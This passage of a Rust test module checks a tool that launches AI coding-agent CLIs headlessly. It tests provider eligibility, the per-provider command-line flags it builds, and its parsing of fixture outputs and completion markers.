        assert!(is_mission_eligible("gemini"));
        assert!(is_mission_eligible("grok"));
        assert!(is_mission_eligible("opencode"));
        assert!(!is_mission_eligible("cursor"));
        assert!(!is_mission_eligible("copilot"));
        assert!(!is_mission_eligible("openrouter"));
        assert!(!is_mission_eligible("custom"));
    }

    #[test]
    fn build_headless_args_constructs_verified_flags() {
        let temp_dir = std::env::temp_dir();
        let prompt_path = temp_dir.join("test_prompt.md");
        std::fs::write(&prompt_path, "Implement feature X").unwrap();

        // Claude
        let claude_args = build_headless_args(
            "claude",
            &prompt_path,
            Some("sonnet"),
            Some("--permission-mode acceptEdits"),
            None,
        )
        .unwrap();
        assert!(claude_args.contains(&"-p".to_string()));
        assert!(claude_args.contains(&"stream-json".to_string()));
        assert!(claude_args.contains(&"--bare".to_string()));
        assert!(claude_args.contains(&"--model".to_string()));
        assert!(claude_args.contains(&"sonnet".to_string()));
        assert!(claude_args.contains(&"acceptEdits".to_string()));

        // Codex
        let last_msg_file = temp_dir.join("last_msg.txt");
        let codex_args = build_headless_args(
            "codex",
            &prompt_path,
            None,
            None,
            Some(&last_msg_file),
        )
        .unwrap();
        assert_eq!(codex_args[0], "exec");
        assert!(codex_args.contains(&"--json".to_string()));
        assert!(codex_args.contains(&"--sandbox".to_string()));
        assert!(codex_args.contains(&"--output-last-message".to_string()));

        // Droid
        let droid_args = build_headless_args("droid", &prompt_path, None, None, None).unwrap();
        assert_eq!(droid_args[0], "exec");
        assert!(droid_args.contains(&"-f".to_string()));
        assert!(droid_args.contains(&prompt_path.to_string_lossy().to_string()));
        assert!(droid_args.contains(&"json".to_string()));

        // Gemini
        let gemini_args = build_headless_args("gemini", &prompt_path, None, None, None).unwrap();
        assert_eq!(gemini_args[0], "-p");
        assert!(gemini_args.contains(&"--output-format".to_string()));
        assert!(gemini_args.contains(&"json".to_string()));

        // Grok
        let grok_args = build_headless_args("grok", &prompt_path, None, None, None).unwrap();
        assert_eq!(grok_args[0], "-p");
        assert!(grok_args.contains(&"--always-approve".to_string()));

        let _ = std::fs::remove_file(prompt_path);
    }

    #[test]
    fn parse_claude_fixture_stream_json() {
        let fixture = include_str!("../fixtures/claude_stream_json.jsonl");
        let res = parse_provider_result("claude", fixture, None).unwrap();
        assert_eq!(
            res.text,
            "Successfully implemented token refresh and added tests."
        );
        assert_eq!(res.session_id, Some("claude_sess_abc123".to_string()));
        assert_eq!(res.cost_usd, Some(0.0245));
        assert!(!res.is_error);
        assert!(res.structured.is_some());
    }

    #[test]
    fn parse_codex_fixture_jsonl() {
        let fixture = include_str!("../fixtures/codex_jsonl.jsonl");
        let res = parse_provider_result("codex", fixture, Some("Token refresh logic implemented."))
            .unwrap();
        assert_eq!(res.text, "Token refresh logic implemented.");
        assert_eq!(res.session_id, Some("thread_xyz789".to_string()));
        assert_eq!(res.cost_usd, Some(0.015));
        assert!(!res.is_error);
    }

    #[test]
    fn parse_droid_fixture_json() {
        let fixture = include_str!("../fixtures/droid_json.json");
        let res = parse_provider_result("droid", fixture, None).unwrap();
        assert_eq!(
            res.text,
            "Completed token refresh endpoint with full coverage."
        );
        assert_eq!(res.session_id, Some("droid_sess_456".to_string()));
        assert_eq!(res.cost_usd, Some(0.008));
        assert!(!res.is_error);
    }

    #[test]
    fn parse_gemini_fixture_json() {
        let fixture = include_str!("../fixtures/gemini_json.json");
        let res = parse_provider_result("gemini", fixture, None).unwrap();
        assert_eq!(
            res.text,
            "Added OAuth token refresh handling in auth controller."
        );
        assert_eq!(res.session_id, Some("gemini_sess_789".to_string()));
        assert_eq!(res.cost_usd, Some(0.005));
        assert!(!res.is_error);
    }

    #[test]
    fn parse_grok_fixture_json() {
        let fixture = include_str!("../fixtures/grok_json.json");
        let res = parse_provider_result("grok", fixture, None).unwrap();
        assert_eq!(
            res.text,
            "OAuth token refresh functionality implemented successfully."
        );
        assert_eq!(res.session_id, Some("grok_sess_101".to_string()));
        assert!(!res.is_error);
    }

    #[test]
    fn parse_opencode_fixture_json() {
        let fixture = include_str!("../fixtures/opencode_json.json");
        let res = parse_provider_result("opencode", fixture, None).unwrap();
        assert_eq!(res.text, "Finished oauth token refresh implementation.");
        assert_eq!(res.session_id, Some("opencode_sess_202".to_string()));
        assert!(!res.is_error);
    }

    #[test]
    fn parse_marker_fallback() {
        let output = "Some logs...\n[SAPLE_DONE:dsp_01J:abc1234]\nAll done!";
        let res = parse_provider_result("custom", output, None).unwrap();
        assert!(!res.is_error);

        let failed_output = "Some error...\n[SAPLE_FAILED:dsp_01J:abc1234]\nBuild failed";
        let res_fail = parse_provider_result("custom", failed_output, None).unwrap();
        assert!(res_fail.is_error);
    }
}

